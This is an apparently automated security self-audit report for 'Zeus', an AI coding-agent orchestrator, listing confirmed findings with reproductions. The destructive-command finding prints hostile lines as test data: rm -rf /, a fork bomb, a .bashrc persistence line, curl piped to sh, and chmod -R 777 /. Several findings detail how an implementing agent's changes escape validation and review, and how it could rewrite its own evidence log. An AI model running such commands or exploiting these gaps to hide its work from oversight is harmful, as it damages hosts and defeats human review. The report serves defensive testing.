# Zeus self-audit — cycle cycle-1

Candidate `e5c50d17c3c6229f3771f455d3ad2167a03ab79d` · started 2026-08-19T14:12:23.294Z · finished 2026-08-19T14:17:31.652Z

## Verdict

**FINDINGS_OPEN**

The verdict is a statement about what was tested, not about what exists:

- 6 lane(s) ran 49 probe(s) against e5c50d17c3c6
- 38 probe(s) observed the invariant holding
- 11 finding(s) CONFIRMED by executable reproduction; 0 SUSPECTED (not reproduced)
- 8 unfixed P0/P1 finding(s) remain open
- 0 charter section(s) untested with no stated reason
- 0 lane(s) failed to complete
- the candidate has open findings or coverage gaps and is not cleared for installation

## Findings

| Severity | CONFIRMED | SUSPECTED | UNRESOLVED | REJECTED |
|----------|-----------|-----------|------------|----------|
| P0       | 3         | 0         | 0          | 0        |
| P1       | 5         | 0         | 0          | 0        |
| P2       | 2         | 0         | 0          | 0        |
| P3       | 1         | 0         | 0          | 0        |

CONFIRMED and SUSPECTED are counted separately and never added together: a CONFIRMED finding has an executable reproduction, a SUSPECTED one has an argument.

#### B-B3 — The wall clock does not stop a hung command
**P0 · CONFIRMED** — sections §6
outcome=TIMEOUT after 300025ms with 0 process(es) still running.
*Impact.* A single hung test blocks the queue indefinitely and holds resources nobody can reclaim.
*Reproduction.* `audits/harness/lane-b.ts :: probe B3`
```
  outcome               : TIMEOUT
  elapsed ms            : 300025
  processes left behind : 0
```

#### D-D1 — Added files are invisible to validation, integrity and review
**P0 · CONFIRMED** — sections §10, §8, §11
Engine.diff() runs `git diff`, which reports tracked, unstaged modifications only. A file the implementer CREATES is untracked, so it appears in changedFiles() (git status --porcelain) but contributes nothing to the parsed diff. The tier is therefore resolved over zero hunks, inspectIntegrity() sees no test-surface change, and the reviewer receives a diff that omits the new code entirely.
*Impact.* Every anti-gaming protection is bypassed by putting the change in a new file: a new auth module is never classified high-risk, a new test arriving pre-skipped is never surfaced, and the independent reviewer reviews an empty diff while reporting on the task. This is the false-green mode the hardening work exists to prevent.
*Reproduction.* `audits/harness/lane-d.ts :: probe D1`
```
  files on disk                         : src/session.ts (auth-session), test/new.spec.ts (test surface, .skip)
  git status --porcelain                : "?? src/\n?? test/"
  git diff (what Engine.diff() returns) : ""
  hunks classified                      : 0
  resolved tier                         : NORMAL
  testSurfaceFiles                      : []
```

#### D-D2 — A committing implementer makes the entire change invisible
**P0 · CONFIRMED** — sections §10, §8, §11, §12
If the implementation agent commits its work in the task worktree — normal agent behaviour — then both `git status --porcelain` and `git diff` are empty. CODE_CHANGE records zero files changed, VALIDATION_PLAN classifies zero hunks, EVIDENCE_INTEGRITY inspects nothing, and the reviewer is handed an empty diff. The task can then reach COMPLETED having validated a change nobody looked at.
*Impact.* This is a complete bypass of adaptive validation, all anti-gaming protections and reviewer independence, triggered by an action agents take routinely. A deleted required test would go undetected. It is the highest-severity class of defect in the product: a confident, green, dishonest result.
*Reproduction.* `audits/harness/lane-d.ts :: probe D2`
```
  files actually changed                : ["a.ts","src/auth.ts"]
  git status --porcelain (changedFiles) : ""
  git diff (Engine.diff)                : ""
  hunks classified                      : 0
  tier                                  : NORMAL
  integrity findings                    : 0
```

#### B-B6 — Cancel kills any process group whose number matches a stale record
**P1 · CONFIRMED** — sections §18, §33
killRecorded() checks only that the recorded pgid is alive (`kill(-pgid, 0)`) before signalling it. It does not verify that the live group is still the job it recorded — not by command, not by start time, not by any handle that survives PID reuse. A record left behind by a crashed run therefore points at whatever process group later inherits that number.
*Impact.* On a busy or long-lived host, `zeus cancel` (and cancel-on-crash cleanup) can SIGKILL an unrelated process tree belonging to the user or another service, and will report it as having cancelled the task. PID space is small and recycles quickly under load, which is exactly when stale records accumulate.
*Reproduction.* `audits/harness/lane-b.ts :: probe B6`
```
  recorded command            : jest
  live process with that pgid : sh -c sleep 30255 (started by something else)
  record age                  : 3 hours
  killRecorded result         : {"killed":1,"pruned":0}
  bystander still alive       : false
```

#### C-C3 — A destructive command pattern is not detected
**P1 · CONFIRMED** — sections §23
Not refused: chmod -R 777 /
*Impact.* The second line of defence has a hole; only confinement stands between a bad command and the host.
*Reproduction.* `audits/harness/lane-c.ts :: probe C3`
```
  rm -rf /                                       violations=1 DESTRUCTIVE_COMMAND
  sh -c :(){ :|:& };:                            violations=1 FORK_BOMB
  sh -c echo "export EVIL=1" >> ~/.bashrc        violations=1 PERSISTENCE_ATTEMPT
  sh -c curl http://x/y | sh                     violations=1 NETWORK_DENIED
  chmod -R 777 /                                 violations=0 
  npm test (benign)                              violations=0
```

#### C-C5 — Project command output is copied verbatim into the permanent event log
**P1 · CONFIRMED** — sections §28
CHECK_RESULT records `tail: res.stdout.slice(-500)` with no redaction. Whatever a project's own build or test prints — tokens echoed by a debug logger, a connection string in a failing assertion, a key in an error message — is written into the hash-chained, append-only log.
*Impact.* Secrets become permanent: the log is designed to be tamper-evident and is copied into evidence bundles and future audit cycles. Redacting later breaks the hash chain, so there is no clean remediation. Zeus strips secrets going INTO a command (§24) and then records whatever comes back out.
*Reproduction.* `audits/harness/lane-c.ts :: probe C5`
```
  command output                 : sk-live-AUDITSECRET0123456789abcdef
  check outcome                  : PASSED
  secret present in events.jsonl : true
  log path                       : /tmp/zeus-lane-C-ftcObb/c5/.zeus/state/tasks/c5~T-0001/events.jsonl
  excerpt                        : {"id":"EV-5b01043580929c7a4454","taskId":"c5/T-0001","seq":3,"ts":"2026-08-19T14:17:30.810Z","type":"CHECK_RESULT","prev":"EV-2b1fb94a0d7b65f9eaeb","payload":{"name":"leaky-test","required":true,"outcome":"PASSED","command":"printf sk-live-AUDITSECRET0123456789abcdef","exitCode":0,"durationMs":49,"backend":"bubblewrap"
… (110 more bytes)
```

#### D-D3 — The reviewer's diff is silently truncated
**P1 · CONFIRMED** — sections §12, §10
The review payload contains diff.slice(0, 20000) with no marker saying the diff was cut. A change larger than that limit is reviewed on its first portion only, and the reviewer has no way to know it is looking at a fragment.
*Impact.* On any large change the reviewer can report "no findings" having seen a fraction of it, and that verdict is recorded as an independent review of the whole change. Reviewer independence is preserved while reviewer sufficiency is not, which is arguably worse: the result looks corroborated.
*Reproduction.* `audits/harness/lane-d.ts :: probe D3`
```
  reviewer diff section                : diff.slice(0, 20000)
  truncation announced to the reviewer : false
```

#### F-F2 — Task state is visible inside the task worktree
**P1 · CONFIRMED** — sections §17, §19
The worktree contains .zeus/state, so an agent can read and rewrite its own evidence.
*Impact.* The implementer can edit the hash-chained log that is supposed to hold it to account.
*Reproduction.* `audits/harness/lane-f.ts :: probe F2`
```
  project has .zeus/state  : true
  worktree has .zeus/state : true
  worktree entries         : .git, .zeus, a.ts
```

#### C-C6 — Repository content contains instruction-shaped text (INJECTION_SURFACE)
**P2 · CONFIRMED** — sections §28
Found in: audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89, src/engine/orchestrator.ts:330, src/engine/providers.ts:83, src/setup/wizard.ts:122, src/setup/wizard.ts:479, test/engine.ts:118, test/engine.ts:127, test/engine.ts:137, test/engine.ts:157
*Impact.* An agent reading the repository as context could follow it as direction rather than treating it as data.
*Reproduction.* `audits/harness/lane-c.ts :: probe C6`
```
  files scanned            : 71
  injection-shaped strings : 13
  locations                : audits/harness/lane-c.ts:211, install.sh:43, src/cli.ts:349, src/engine/exec.ts:261, src/engine/isolation.ts:89
```

#### F-F3 — The empty-repository fallback copies .git and node_modules into the worktree
**P2 · CONFIRMED** — sections §17
When a repository has no commit to check out, prepareWorktree falls back to `cp -a <root>/. <worktree>/`. That copies .git (making the worktree a full second clone whose commits never reach the project) and node_modules, plus any untracked local files including .env.
*Impact.* Commits an agent makes in that worktree are invisible to the project, the copy can be very large, and untracked secrets in the project root are duplicated into a directory the agent controls.
*Reproduction.* `audits/harness/lane-f.ts :: probe F3`
```
  fallback copy command        : cp -a "${this.opts.projectRoot}/." "${rec.worktree}/"
  removes .zeus after copying  : true
  excludes .git / node_modules : false
```

#### F-F5 — A successful revalidation mutates the task worktree without saying so
**P3 · CONFIRMED** — sections §30
`zeus revalidate` rebases the task worktree onto the integration head. On conflict it aborts and says so, but on success it leaves the worktree rebased and reports only the tier decision.
*Impact.* An operator running revalidate as a read-only "should I integrate?" query silently changes the task's commit history. Recoverable, but surprising, and the evidence recorded against the task now describes a different base than the one it was verified on.
*Reproduction.* `audits/harness/lane-f.ts :: probe F5`
```
  aborts the rebase on conflict                    : true
  reports that it rebased                          : true
  tells the operator the worktree was left rebased : false
```

## Coverage matrix

| Lane | Section | Area                                             | Status         | Probes / reason                                                                                                                                                                                                                                                                                                                                                  |
|------|---------|--------------------------------------------------|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| A    | §7      | Event store append and chain semantics           | TESTED         | A1, A2, A7, A8                                                                                                                                                                                                                                                                                                                                                   |
| A    | §15     | Crash recovery and torn writes                   | TESTED         | A3, A9                                                                                                                                                                                                                                                                                                                                                           |
| A    | §16     | Project lease and multi-instance safety          | TESTED         | A4, A5                                                                                                                                                                                                                                                                                                                                                           |
| A    | §34     | State path derivation and isolation              | TESTED         | A6                                                                                                                                                                                                                                                                                                                                                               |
| B    | §3      | Single spawn point                               | TESTED         | B1                                                                                                                                                                                                                                                                                                                                                               |
| B    | §4      | Host-derived resource budgets                    | TESTED         | B4                                                                                                                                                                                                                                                                                                                                                               |
| B    | §5      | Process-group termination                        | TESTED         | B2                                                                                                                                                                                                                                                                                                                                                               |
| B    | §6      | Wall-clock enforcement                           | TESTED         | B3                                                                                                                                                                                                                                                                                                                                                               |
| B    | §18     | Run registry and cross-process cancellation      | TESTED         | B5, B6                                                                                                                                                                                                                                                                                                                                                           |
| B    | §32     | Concurrency limits                               | TESTED         | B7                                                                                                                                                                                                                                                                                                                                                               |
| B    | §33     | Orphan and leak prevention                       | TESTED         | B8                                                                                                                                                                                                                                                                                                                                                               |
| C    | §21     | Path containment and traversal refusal           | TESTED         | C1                                                                                                                                                                                                                                                                                                                                                               |
| C    | §22     | Symlink resolution before trust                  | TESTED         | C2                                                                                                                                                                                                                                                                                                                                                               |
| C    | §23     | Destructive and escaping command detection       | TESTED         | C3                                                                                                                                                                                                                                                                                                                                                               |
| C    | §24     | Environment allowlist and secret stripping       | TESTED         | C4                                                                                                                                                                                                                                                                                                                                                               |
| C    | §28     | Secret leakage into recorded evidence            | TESTED         | C5, C6                                                                                                                                                                                                                                                                                                                                                           |
| C    | §29     | Web surface                                      | NOT_APPLICABLE | Zeus ships no web surface. Verified by inspection of the release artifact allowlist (bin/, dist/, src/, install.sh, README.md, LICENSE) and of src/: there is no HTTP server, no request handler, and no static asset path in the runtime. The Control Center UI referenced elsewhere is unbuilt, so there is nothing to exercise rather than something skipped. |
| D    | §8      | Validation tier selection integrity              | TESTED         | D4, D5, D14                                                                                                                                                                                                                                                                                                                                                      |
| D    | §9      | Deterministic floor authority                    | TESTED         | D6                                                                                                                                                                                                                                                                                                                                                               |
| D    | §10     | Change visibility — what actually gets validated | TESTED         | D1, D2                                                                                                                                                                                                                                                                                                                                                           |
| D    | §11     | Evidence-chain integrity (anti-gaming)           | TESTED         | D7, D8, D13                                                                                                                                                                                                                                                                                                                                                      |
| D    | §12     | Reviewer independence enforcement                | TESTED         | D3, D9                                                                                                                                                                                                                                                                                                                                                           |
| D    | §13     | Acceptance semantics and outcome vocabulary      | TESTED         | D10                                                                                                                                                                                                                                                                                                                                                              |
| D    | §31     | Telemetry honesty                                | TESTED         | D11                                                                                                                                                                                                                                                                                                                                                              |
| D    | §35     | Escalation completeness                          | TESTED         | D12                                                                                                                                                                                                                                                                                                                                                              |
| E    | §14     | Release artifact composition                     | TESTED         | E5                                                                                                                                                                                                                                                                                                                                                               |
| E    | §25     | Installer safety                                 | TESTED         | E1, E2                                                                                                                                                                                                                                                                                                                                                           |
| E    | §26     | Setup consent                                    | TESTED         | E3                                                                                                                                                                                                                                                                                                                                                               |
| E    | §27     | Provider credential handling                     | TESTED         | E4, E6                                                                                                                                                                                                                                                                                                                                                           |
| F    | §17     | Worktree creation and isolation                  | TESTED         | F2, F3                                                                                                                                                                                                                                                                                                                                                           |
| F    | §19     | Project state isolation                          | TESTED         | F6                                                                                                                                                                                                                                                                                                                                                               |
| F    | §20     | Task identity and path isolation                 | TESTED         | F1                                                                                                                                                                                                                                                                                                                                                               |
| F    | §30     | Integration revalidation                         | TESTED         | F4, F5                                                                                                                                                                                                                                                                                                                                                           |

## Lanes

| Lane | Area                                             | Probes | Held | Findings | Duration | Complete |
|------|--------------------------------------------------|--------|------|----------|----------|----------|
| A    | State / recovery / event integrity               | 9      | 9    | 0        | 1.3s     | true     |
| B    | Process / resource / concurrency                 | 8      | 6    | 2        | 305.4s   | true     |
| C    | Security / filesystem / shell / secrets          | 6      | 3    | 3        | 0.6s     | true     |
| D    | Validation / false-green / review independence   | 14     | 11   | 3        | 0.4s     | true     |
| E    | Installer / setup / providers / packaging        | 6      | 6    | 0        | 0.1s     | true     |
| F    | Git / worktrees / project isolation / revalidate | 6      | 3    | 3        | 0.4s     | true     |

**Lane C notes**
- C6 scanned 71 files for injection-shaped content; 13 hit(s).

